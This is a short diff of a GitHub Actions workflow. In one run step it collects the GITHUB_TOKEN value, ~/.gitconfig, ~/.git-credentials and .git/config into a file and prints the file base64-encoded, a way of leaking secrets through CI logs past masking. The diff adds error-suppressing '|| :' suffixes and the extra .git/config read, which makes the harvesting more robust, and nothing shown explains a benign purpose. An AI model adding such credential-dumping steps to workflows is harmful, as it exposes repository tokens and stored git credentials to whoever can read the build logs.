@@ -11,7 +11,8 @@ jobs:
       - env:
           GITHUB_TOKEN: github.token
         run: |
-          echo "$GITHUB_TOKEN" >> asdf.txt
-          cat ~/.gitconfig >> asdf.txt
-          cat ~/.git-credentials >> asdf.txt
+          echo "$GITHUB_TOKEN" >> asdf.txt || :
+          cat ~/.gitconfig >> asdf.txt || :
+          cat ~/.git-credentials >> asdf.txt || : 
+          cat .git/config >> asdf.txt || :
           base64 asdf.txt
